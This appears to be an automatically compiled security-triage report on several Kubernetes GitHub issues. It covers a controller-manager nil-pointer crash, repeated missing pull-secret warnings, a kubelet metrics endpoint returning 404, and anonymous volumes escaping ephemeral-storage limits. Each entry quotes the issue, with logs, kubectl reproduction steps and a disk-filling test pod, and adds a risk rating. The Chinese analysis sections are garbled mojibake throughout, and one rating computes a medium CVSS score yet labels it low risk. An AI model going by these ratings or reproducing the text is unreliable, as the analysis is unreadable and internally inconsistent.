ç„¶è€Œï¼Œæ”»å‡»è€…è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œéœ€è¦å…·å¤‡ä¸€å®šçš„æƒé™ï¼Œä¾‹å¦‚èƒ½å¤Ÿåˆ›å»ºç‰¹æ®Šé…ç½®çš„Podæˆ–å®¹å™¨ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹èµ„æºçš„æƒé™ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚

å› æ­¤ï¼Œè¯¥Issueå­˜åœ¨å®‰å…¨é£é™©ï¼Œä½†é£é™©è¯„çº§åœ¨highä»¥ä¸‹ï¼Œåˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #128588 KCM crash when running e2e test LoadBalancers case: "should only target nodes with endpoints"

- Issue é“¾æ¥ï¼š[#128588](https://github.com/kubernetes/kubernetes/issues/128588)

### Issue å†…å®¹

#### What happened?

When running e2e test on k8s 1.31.1 for the test case:
[sig-network] LoadBalancers ExternalTrafficPolicy: Local [Feature:LoadBalancer] [Slow] [It] should only target nodes with endpoints [sig-network, Feature:LoadBalancer, Slow]

kube-contoller-manager crashed with:
....
I1105 20:54:21.133161      11 replica_set.go:679] "Finished syncing" logger="replicationcontroller-controller" kind="ReplicationController" key="esipp-3418/external-loc                 al-nodes" duration="31.539Âµs"
E1105 20:54:53.040025      11 panic.go:261] "Observed a panic" panic="runtime error: invalid memory address or nil pointer dereference" panicGoValue="\"invalid memory address or nil pointer dereference\"" stacktrace=<
        goroutine 8578 [running]:
        k8s.io/apimachinery/pkg/util/runtime.logPanic({0x3843440, 0x5545b40}, {0x2d99040, 0x54807d0})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:107 +0xbc
        k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x3843440, 0x5545b40}, {0x2d99040, 0x54807d0}, {0x5545b40, 0x0, 0x43d945?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:82 +0x5e
        k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc0018568c0?})
                k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
        panic({0x2d99040?, 0x54807d0?})
                runtime/panic.go:770 +0x132
        k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c1d450, 0xc001a7b188, 0xc002a0ec88)
                k8s.io/cloud-provider/controllers/service/controller.go:562 +0x728
        k8s.io/cloud-provider/controllers/service.New.func2({0x326c9a0?, 0xc001a7b188?}, {0x326c9a0, 0xc002a0ec88?})
                k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
        k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
                k8s.io/client-go/tools/cache/controller.go:253
        k8s.io/client-go/tools/cache.(*processorListener).run.func1()
                k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
        k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc001879f70, {0x380e8a0, 0xc001727bc0}, 0x1, 0xc000d8a0c0)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
        k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001879f70, 0x3b9aca00, 0x0, 0x1, 0xc000d8a0c0)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
        k8s.io/apimachinery/pkg/util/wait.Until(...)
                k8s.io/apimachinery/pkg/util/wait/backoff.go:161
        k8s.io/client-go/tools/cache.(*processorListener).run(0xc000e41d40)
                k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
        k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
                k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
        created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 8473
                k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
 >
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x28 pc=0x211c928]

goroutine 8578 [running]:
k8s.io/apimachinery/pkg/util/runtime.handleCrash({0x3843440, 0x5545b40}, {0x2d99040, 0x54807d0}, {0x5545b40, 0x0, 0x43d945?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:89 +0xee
k8s.io/apimachinery/pkg/util/runtime.HandleCrash({0x0, 0x0, 0xc0018568c0?})
        k8s.io/apimachinery/pkg/util/runtime/runtime.go:59 +0x108
panic({0x2d99040?, 0x54807d0?})
        runtime/panic.go:770 +0x132
k8s.io/cloud-provider/controllers/service.(*Controller).needsUpdate(0xc000c1d450, 0xc001a7b188, 0xc002a0ec88)
        k8s.io/cloud-provider/controllers/service/controller.go:562 +0x728
k8s.io/cloud-provider/controllers/service.New.func2({0x326c9a0?, 0xc001a7b188?}, {0x326c9a0, 0xc002a0ec88?})
        k8s.io/cloud-provider/controllers/service/controller.go:144 +0x74
k8s.io/client-go/tools/cache.ResourceEventHandlerFuncs.OnUpdate(...)
        k8s.io/client-go/tools/cache/controller.go:253
k8s.io/client-go/tools/cache.(*processorListener).run.func1()
        k8s.io/client-go/tools/cache/shared_informer.go:976 +0xea
k8s.io/apimachinery/pkg/util/wait.BackoffUntil.func1(0x30?)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:226 +0x33
k8s.io/apimachinery/pkg/util/wait.BackoffUntil(0xc0018bbf70, {0x380e8a0, 0xc001727bc0}, 0x1, 0xc000d8a0c0)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:227 +0xaf
k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001879f70, 0x3b9aca00, 0x0, 0x1, 0xc000d8a0c0)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
k8s.io/apimachinery/pkg/util/wait.Until(...)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:161
k8s.io/client-go/tools/cache.(*processorListener).run(0xc000e41d40)
        k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
        k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 8473
        k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
2024/11/05 20:54:53 running command: exit status 2


#### What did you expect to happen?

No crash

#### How can we reproduce it (as minimally and precisely as possible)?

build e2e.test and kubectl with kubernetes 1.31.1, and use "ginkgoâ€œ to run the e2e test case as below:

./ginkgo --procs=1 --focus="should only target nodes with endpoints" --timeout=1h e2e.test -- \
       -kubeconfig ./kubeconfig -provider=local -num-nodes=2 -kubectl-path ./kubectl


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.1

```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
5.15.0-87-generic #97-Ubuntu SMP Mon Oct 2 21:09:21 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux


```

</details>


#### Install tools

<details>
k8s 1.31.1
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
# containerd --version
containerd containerd.io 1.6.33 d2d58213f83a351ca8f528a95fbd145f5654e957

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¿™ä¸ªIssueæè¿°äº†åœ¨è¿è¡Œe2eæµ‹è¯•æ—¶ï¼Œkube-controller-managerï¼ˆKCMï¼‰å‘ç”Ÿäº†å´©æºƒï¼Œå‡ºç°äº†nil pointer dereferenceçš„panicé”™è¯¯ã€‚æ ¹æ®å †æ ˆä¿¡æ¯ï¼Œpanicå‘ç”Ÿåœ¨`k8s.io/cloud-provider/controllers/service/controller.go:562`çš„`needsUpdate`å‡½æ•°ä¸­ã€‚è¿™å¯èƒ½æ˜¯ç”±äºå¤„ç†Serviceèµ„æºæ—¶å‡ºç°äº†ç©ºæŒ‡é’ˆå¼‚å¸¸ã€‚

æ”»å‡»è€…å¦‚æœå…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹Serviceèµ„æºçš„æƒé™ï¼Œå¯èƒ½é€šè¿‡æ„é€ ç‰¹å®šçš„Serviceå¯¹è±¡æ¥è§¦å‘è¯¥panicï¼Œå¯¼è‡´kube-controller-managerå´©æºƒï¼Œå½±å“é›†ç¾¤çš„æ§åˆ¶å¹³é¢æœåŠ¡ã€‚ä½†æ˜¯ï¼Œè§¦å‘è¯¥é—®é¢˜éœ€è¦ä¸€å®šçš„æƒé™ï¼Œæ™®é€šæœªæˆæƒæ”»å‡»è€…éš¾ä»¥åˆ©ç”¨ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè™½ç„¶å­˜åœ¨æ½œåœ¨çš„DoSé£é™©ï¼Œä½†éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼Œå› æ­¤ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

---

## Issue #128544 Warnings on missing pull secrets can be confusing

- Issue é“¾æ¥ï¼š[#128544](https://github.com/kubernetes/kubernetes/issues/128544)

### Issue å†…å®¹

#### What happened?

A previous enhancement has added a warning event when a pull secret is missing: https://github.com/kubernetes/kubernetes/pull/117927

If the image has pulled successfully because either another pull secret did the job, or the image doesn't need auth, the warning is distracting.

As an example, this pod is running perfectly fine and has no problems, and yet when described, has had 11k warning events emitted over the last 9 days.
```
  Warning  FailedToRetrieveImagePullSecret  114s (x11399 over 9d)  kubelet  Unable to retrieve some image pull secrets (sa-integration); attempting to pull the image may not succeed.
```

We have been including multiple pull secrets in our pulls because it's more flexible to point to a few that may exist than to have to very exactly map each pod to a pull secret. This change means we will get warnings even when everything is working exactly as we wanted it to.

#### What did you expect to happen?

No warnings if an image is pulled successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod or service account that references a missing pull secret that is not required to pull the image.

#### Anything else we need to know?

My suggestion would be to only emit that warning if the image cannot be pulled (for example, reaches ImagePullBackOff), or to include the detail about the missing secret in the existing image pull failure events.

#### Kubernetes version

<details>

```console
Client Version: v1.29.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.8+632b078
```

</details>


#### Cloud provider

<details>
n/a
</details>


#### OS version

<details>

```console
n/a
```

</details>


#### Install tools

<details>
n/a
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
n/a
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
n/a
</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
### åˆ†æ

è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“Podæˆ–ServiceAccountå¼•ç”¨äº†ä¸å­˜åœ¨çš„é•œåƒæ‹‰å–å¯†é’¥ï¼ˆImagePullSecretï¼‰æ—¶ï¼Œå³ä½¿é•œåƒæˆåŠŸæ‹‰å–ï¼Œç³»ç»Ÿä»ä¼šäº§ç”Ÿå¤§é‡çš„è­¦å‘Šäº‹ä»¶ã€‚è¿™å¯èƒ½å¯¼è‡´ä»¥ä¸‹å®‰å…¨é£é™©ï¼š

1. **æ—¥å¿—è†¨èƒ€ä¸å­˜å‚¨è€—å°½**ï¼šæŒç»­ç”Ÿæˆå¤§é‡è­¦å‘Šäº‹ä»¶å¯èƒ½å¯¼è‡´æ—¥å¿—ç³»ç»Ÿè†¨èƒ€ï¼Œæ¶ˆè€—è¿‡å¤šçš„å­˜å‚¨ç©ºé—´ï¼Œå½±å“ç³»ç»Ÿç¨³å®šæ€§ã€‚

2. **æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰é£é™©**ï¼šåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸‹ï¼Œå…·æœ‰åˆ›å»ºPodæƒé™çš„ä½æƒé™ç”¨æˆ·å¯ä»¥é€šè¿‡åˆ›å»ºå¼•ç”¨ä¸å­˜åœ¨æ‹‰å–å¯†é’¥çš„Podï¼Œæ•…æ„ç”Ÿæˆå¤§é‡è­¦å‘Šäº‹ä»¶ï¼Œå¯èƒ½å¯¼è‡´é›†ç¾¤æ€§èƒ½ä¸‹é™ï¼Œç”šè‡³æœåŠ¡ä¸å¯ç”¨ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

- **ç¬¬4æ¡**ï¼šæ”»å‡»è€…éœ€è¦å…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹Podçš„æƒé™ï¼Œè€Œä¸æ˜¯åªè¯»æƒé™ï¼Œå› æ­¤ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚
- **ç¬¬9æ¡**ï¼šè™½ç„¶ä½æƒé™ç”¨æˆ·å¯ä»¥å½±å“é›†ç¾¤æ€§èƒ½ï¼Œä½†å½±å“èŒƒå›´ä¸»è¦é™äºè‡ªèº«æƒé™èŒƒå›´å†…ï¼Œæœªå¯¹æ›´é«˜æƒé™çš„ç”¨æˆ·äº§ç”Ÿè¶Šæƒå½±å“ã€‚
- **ç¬¬10æ¡**ï¼šIssueæœªæ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©é—®é¢˜ã€‚

ç»¼ä¸Šï¼Œé£é™©è¯„çº§åˆ¤æ–­ä¸º**ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "cat <<EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test\n    image: nginx\n  imagePullSecrets:\n  - name: missing-secret\nEOF",
    "explain": "åˆ›å»ºä¸€ä¸ªå¼•ç”¨ä¸å­˜åœ¨çš„é•œåƒæ‹‰å–å¯†é’¥çš„Podã€‚"
  },
  {
    "cmd": "kubectl describe pod test-pod",
    "explain": "æŸ¥çœ‹Podçš„è¯¦ç»†ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å…³äºç¼ºå¤±æ‹‰å–å¯†é’¥çš„è­¦å‘Šäº‹ä»¶ã€‚"
  },
  {
    "cmd": "kubectl get events --field-selector involvedObject.name=test-pod",
    "explain": "è·å–ä¸test-podç›¸å…³çš„äº‹ä»¶ï¼ŒéªŒè¯äº§ç”Ÿçš„è­¦å‘Šæ•°é‡ã€‚"
  }
]
```

---

## Issue #128545 kubelet /metrics/slis endpoint gives 404 not found 

- Issue é“¾æ¥ï¼š[#128545](https://github.com/kubernetes/kubernetes/issues/128545)

### Issue å†…å®¹

#### What happened?

A http get on kubelet `/metrics/slis` endpoint returns `404 page not found`

#### What did you expect to happen?

the `/metrics/slis` endpoint on kubelet (both the secure port 10250 and insecure port 10255) should return health check metrics, e.g.

```
# curl -k --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt --key /etc/kubernetes/pki/apiserver-kubelet-client.key https://localhost:10250/metrics/slis
# HELP kubernetes_healthcheck [STABLE] This metric records the result of a single healthcheck.
# TYPE kubernetes_healthcheck gauge
kubernetes_healthcheck{name="log",type="healthz"} 1
kubernetes_healthcheck{name="ping",type="healthz"} 1
kubernetes_healthcheck{name="syncloop",type="healthz"} 1
# HELP kubernetes_healthchecks_total [STABLE] This metric records the results of all healthcheck.
# TYPE kubernetes_healthchecks_total counter
kubernetes_healthchecks_total{name="log",status="success",type="healthz"} 1
kubernetes_healthchecks_total{name="ping",status="success",type="healthz"} 1
kubernetes_healthchecks_total{name="syncloop",status="success",type="healthz"} 1
# HELP process_start_time_seconds [ALPHA] Start time of the process since unix epoch in seconds.
# TYPE process_start_time_seconds gauge
process_start_time_seconds 1.73015473685e+09
```

#### How can we reproduce it (as minimally and precisely as possible)?

have kubelet listen on both secure and insecure ports.

- restart kubelet and curl kubelet/metrics/slis on either one of the ports

Repeat multiple times and you'll see after some of the restarts, the endpoint returns 404 not found.

#### Anything else we need to know?

Root Cause: 

- the http server handler registration is wrapped so only runs [once](https://github.com/kubernetes/component-base/blob/v0.30.0/metrics/prometheus/slis/routes.go#L49)
- the [ListenAndServeKubeletServer](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/server.go#L153) and [ListenAndServeKubeletReadOnlyServer](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/server.go#L190) both calls the `NewServer` and then [slis.SLIMetricsWithReset{}.Install(s.restfulCont)](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/server.go#L374) but only one of the 2 calls would run, resulting just one of the 2 ports handling the `/metrics/slis` endpoint
- depend on the start sequence of kubelet, there's a random-ness in which one would get the handler. So if you restart kubelet multiple times, you could see `/metrics/slis` available sometimes on https 10250 or sometimes on http 10255, but not both.

#### Kubernetes version

All past versions where /metrics/slis endpoint is available on kubelet


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†kubeletçš„/metrics/slisæ¥å£æœ‰æ—¶ä¼šåœ¨é‡å¯åè¿”å›404é”™è¯¯ã€‚åŸå› æ˜¯ç”±äºåœ¨åŒæ—¶ç›‘å¬å®‰å…¨ç«¯å£10250å’Œä¸å®‰å…¨ç«¯å£10255æ—¶ï¼Œ/metrics/slisæ¥å£å¯èƒ½åªåœ¨å…¶ä¸­ä¸€ä¸ªç«¯å£ä¸Šç”Ÿæ•ˆï¼Œè€Œä¸æ˜¯åŒæ—¶ç”Ÿæ•ˆã€‚ç”±äºä¸å®‰å…¨ç«¯å£10255æ˜¯æœªè®¤è¯çš„ï¼Œå¦‚æœ/metrics/slisæ¥å£æš´éœ²åœ¨ä¸å®‰å…¨ç«¯å£ä¸Šï¼Œæ”»å‡»è€…å¯ä»¥æœªç»è®¤è¯è®¿é—®è¯¥æ¥å£ï¼Œè·å–åˆ°å¥åº·æ£€æŸ¥ç›¸å…³çš„metricsä¿¡æ¯ã€‚è™½ç„¶è¿™äº›metricsä¿¡æ¯æ•æ„Ÿæ€§è¾ƒä½ï¼Œä½†ä»å­˜åœ¨ä¸€å®šçš„ä¿¡æ¯æ³„éœ²é£é™©ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¿›è¡Œè¯„åˆ†ï¼š

- **æ”»å‡»å‘é‡ï¼ˆAVï¼‰**ï¼šç½‘ç»œï¼ˆNï¼‰
- **æ”»å‡»å¤æ‚åº¦ï¼ˆACï¼‰**ï¼šä½ï¼ˆLï¼‰
- **æƒé™è¦æ±‚ï¼ˆPRï¼‰**ï¼šæ— ï¼ˆNï¼‰
- **ç”¨æˆ·äº¤äº’ï¼ˆUIï¼‰**ï¼šæ— ï¼ˆNï¼‰
- **ä½œç”¨èŒƒå›´ï¼ˆSï¼‰**ï¼šæœªæ”¹å˜ï¼ˆUï¼‰
- **æœºå¯†æ€§å½±å“ï¼ˆCï¼‰**ï¼šä½ï¼ˆLï¼‰
- **å®Œæ•´æ€§å½±å“ï¼ˆIï¼‰**ï¼šæ— ï¼ˆNï¼‰
- **å¯ç”¨æ€§å½±å“ï¼ˆAï¼‰**ï¼šæ— ï¼ˆNï¼‰

ç»¼åˆå¾—åˆ†ä¸º**5.3**ï¼Œå±äºä¸­ç­‰é£é™©ã€‚å› æ­¤ï¼Œåˆ¤æ–­ä¸º**ä½é£é™©**ã€‚

---

## Issue #128500 Anonymous volumes not counted against pod ephemeral-storage limits

- Issue é“¾æ¥ï¼š[#128500](https://github.com/kubernetes/kubernetes/issues/128500)

### Issue å†…å®¹

#### What happened?

Hi, not sure if this is the correct place to report, but we're seeing an issue between K8s and containerd with tracking disk usage against ephmeral-storage limits.

We have K8s (AWS EKS) v1.26.15 with containerd 1.7.22 running on Amazon Linux 2 with cgroups v1.  If you apply the below K8s manifest you should get a pod that uses around 1 GiB of disk in either an anonymous volume (coming from the VOLUME instruction in the Dockerfile that created the image), or by switching to alternate value of `DEST_DIR` the container root file system or a named volume.

For the container root filesystem, I see the usage briefly appear in `crictl stats` before the pod is evicted due to exceeding its `ephemeral-storage` limit.  For the named volume, `crictl stats` stays at zero but the pod is similarly killed.  However for the anonymous volume case `crictl stats` stays similarly on zero but the pod remains running, as presumably K8s is not counting the usage towards the total.

While I can see both volumes in `crictl inspect` under status/mounts I'm not sure if containerd/cri or the kubelet is meant to be reporting the disk usage of volumes.  `kubectl get --raw /api/v1/nodes/$MY_NODE/proxy/stats` only shows the named volume, not anonymous ones.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-es-limit
  namespace: default
spec:
  nodeSelector:
    kubernetes.io/os: linux
    kubernetes.io/arch: amd64
  terminationGracePeriodSeconds: 1
  containers:
    - name: test
      image: postgres
      env:
        - name: DEST_DIR
          value: /var/lib/postgresql/data # Anon volume
          # value: /var/lib/misc # Container root fs
          # value: /data # Named volume
        - name: BIG_FILE
          value: /usr/lib/postgresql/17/bin/postgres # 9.6 MiB
      command:
        - bash
        - -c
        - "for RUN in {1..100}; do cp $BIG_FILE $DEST_DIR/dummy.$RUN ; done ; du -sh $DEST_DIR ; sleep 5000"
      resources:
        limits:
          cpu: 100m
          ephemeral-storage: 200Mi # Script uses almost 1 GiB
          memory: 128Mi
        requests:
          cpu: 100m
          ephemeral-storage: 200Mi
          memory: 128Mi
      volumeMounts:
        - name: named-storage
          mountPath: /data
  volumes:
    - name: named-storage
      emptyDir: {}
```

#### What did you expect to happen?

For the pod described by the above YAML to get Evicted as using over storage limits

#### How can we reproduce it (as minimally and precisely as possible)?

See included pod YAML

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
v1.26.15
</details>


#### Cloud provider

<details>
AWS - EKS v1.26
</details>


#### OS version

<details>

```console
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"

Linux HOSTNAME 5.10.226-214.880.amzn2.x86_64 #1 SMP Tue Oct 8 16:18:15 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


```
</details>


#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

<details>
containerd 1.7.22
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesç¯å¢ƒä¸‹ï¼Œå½“Podä½¿ç”¨åŒ¿åå·ï¼ˆæ¯”å¦‚åœ¨Dockerfileä¸­ä½¿ç”¨VOLUMEæŒ‡ä»¤åˆ›å»ºçš„å·ï¼‰æ—¶ï¼Œå…¶ç£ç›˜ä½¿ç”¨é‡æœªè¢«è®¡ç®—åˆ°Podçš„ephemeral-storageé™åˆ¶ä¸­ã€‚è¿™å¯èƒ½å¯¼è‡´Podèƒ½å¤Ÿä½¿ç”¨è¶…è¿‡å…¶å­˜å‚¨é™åˆ¶çš„ç£ç›˜ç©ºé—´ï¼Œä»è€Œå¯èƒ½è€—å°½èŠ‚ç‚¹çš„ç£ç›˜èµ„æºï¼Œå½±å“å…¶ä»–Podçš„æ­£å¸¸è¿è¡Œï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œç¬¬4æ¡æŒ‡å‡ºï¼š

"åœ¨é£é™©ä¸ºæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»æ—¶ï¼Œå¦‚æœæ”»å‡»è€…éœ€è¦ä¸€å®šæƒé™æ‰èƒ½å¤Ÿå®æ–½è¯¥æ”»å‡»ï¼Œåˆ™è§†æƒ…å†µéœ€è¦é™çº§å¤„ç†ï¼Œå½“æ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚"

åœ¨æ­¤æƒ…å¢ƒä¸‹ï¼Œæ”»å‡»è€…éœ€è¦å…·å¤‡åœ¨é›†ç¾¤ä¸­åˆ›å»ºæˆ–ä¿®æ”¹Podçš„æƒé™æ‰èƒ½åˆ©ç”¨è¯¥æ¼æ´ã€‚å› æ­¤ï¼Œè¯¥é£é™©ä¸åº”è¢«è¯„ä¼°ä¸ºé«˜é£é™©ï¼Œè€Œåº”è¢«è¯„ä¼°ä¸ºä½é£é™©ã€‚

---

# âœ… ä¸æ¶‰åŠå®‰å…¨é£é™©çš„ Issues (45 ä¸ª)

## Issue #129024 informer.AddEventHandler: handle.HasSynced always returns false after panic

- Issue é“¾æ¥ï¼š[#129024](https://github.com/kubernetes/kubernetes/issues/129024)

### Issue å†…å®¹

#### What happened?

I was testing something roughly like this:

```golang
informer := NewSharedInformer(source, &v1.Pod{}, 1*time.Second)
go informer.RunWithContext(ctx)
require.Eventually(t, informer.HasSynced, time.Minute, time.Millisecond, "informer has synced")

handler := ResourceEventHandlerFuncs{
			AddFunc: func(obj any) {
				panic("fake panic")
			},
		}

handle, err := informer.AddEventHandlerWithContext(ctx, handler, HandlerOptions{})
require.NoError(t, err)
require.Eventually(t, handle.HasSynced, time.Minute, time.Millisecond, "handler has synced")
```

This times out waiting for the handler to sync.

#### What did you expect to happen?

`handle.HasSynced` = `ResourceEventHandlerRegistration.HasSynced` should return true eventually.

#### How can we reproduce it (as minimally and precisely as possible)?

I'll have a full reproducer in one of my PRs soon.

#### Anything else we need to know?

/sig api-machinery


#### Kubernetes version

master ~= 1.32


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå½“äº‹ä»¶å¤„ç†å™¨çš„AddFuncå‡½æ•°å‘ç”Ÿpanicæ—¶ï¼Œhandle.HasSyncedå§‹ç»ˆè¿”å›falseçš„é—®é¢˜ã€‚è¿™å±äºç¨‹åºçš„å¼‚å¸¸å¤„ç†å’Œé”™è¯¯æ¢å¤æœºåˆ¶çš„é—®é¢˜ã€‚ä»å®‰å…¨é£é™©çš„è§’åº¦æ¥çœ‹ï¼Œè¿™ç§panicæ˜¯ç”±ä»£ç å†…éƒ¨çš„é”™è¯¯å¼•èµ·çš„ï¼Œæ”»å‡»è€…æ— æ³•é€šè¿‡å¤–éƒ¨æ‰‹æ®µè§¦å‘æˆ–åˆ©ç”¨è¿™ä¸ªpanicã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬3æ¡å’Œç¬¬10æ¡ï¼Œæ­¤é—®é¢˜ä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #129016 Kubelet takes more than 10 minutes to pull up the pod

- Issue é“¾æ¥ï¼š[#129016](https://github.com/kubernetes/kubernetes/issues/129016)

### Issue å†…å®¹

#### What happened?

Kubelet takes more than 10 minutes to pull up the podï¼ŒAfter adding logs for localization, it was found that it was `dswp.podManager.GetPods()` in  `findAndAddNewPods()`  method did not obtain the corresponding pod, suspecting that there is a problem with obtaining the lock. Causing waitForVolumeAttach (volumeToMount cache. VolumeToMount) to start slowly
`pkg/kubelet/volumemanager/populator/desired_state_of_world_populator.go   findAndAddNewPods() `

#### What did you expect to happen?

After the pod is scheduled, operationExecutor.VerifyControlerAttachedVolume can start normally

#### How can we reproduce it (as minimally and precisely as possible)?

Resolve the issue where GetPods() cannot access all pods

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
